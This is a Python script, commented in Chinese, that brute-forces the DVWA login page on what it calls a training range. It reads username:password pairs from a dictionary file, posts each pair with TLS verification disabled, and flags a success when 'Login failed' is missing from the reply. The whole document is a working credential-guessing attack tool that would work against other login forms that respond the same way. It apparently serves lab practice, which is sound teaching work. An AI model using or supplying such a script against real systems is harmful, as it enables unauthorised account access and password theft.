import requests

# 1. 配置靶场地址（根据校内/校外环境选择）
TARGET_URL = "http://10.0.34.39:21252/login.php"  # 校内地址
# TARGET_URL = "https://www.s.1234512.xyz/login.php"  # 校外地址

# 2. 加载可扩展的密码字典（字典文件需自行创建）
def load_password_dict(file_path):
    """从文件加载账号密码字典，支持扩展"""
    dict_list = []
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and ":" in line:
                    user, pwd = line.split(":", 1)
                    dict_list.append((user, pwd))
        print(f"已加载{len(dict_list)}组账号密码")
    except FileNotFoundError:
        print(f"字典文件{file_path}不存在")
    return dict_list

# 3. 暴力破解核心逻辑
def brute_force_dvwa(url, dict_list):
    session = requests.Session()
    requests.packages.urllib3.disable_warnings()  # 忽略HTTPS证书警告
    for user, pwd in dict_list:
        # 构造DVWA登录表单数据
        login_data = {"username": user, "password": pwd, "Login": "Login"}
        try:
            response = session.post(url, data=login_data, verify=False, timeout=5)
            # 判断登录是否成功（DVWA失败会包含"Login failed"）
            if "Login failed" not in response.text:
                print(f"\n破解成功：账号={user}，密码={pwd}")
                return
            print(f"尝试失败：{user}:{pwd}")
        except Exception as e:
            print(f"请求异常：{user}:{pwd} - {str(e)}")
    print("\n字典中无正确账号密码")

# 4. 执行脚本
if __name__ == "__main__":
    # 加载字典（字典文件可自行扩展密码组合）
    password_dict = load_password_dict("password_dict.txt")
    # 执行破解
    brute_force_dvwa(TARGET_URL, password_dict)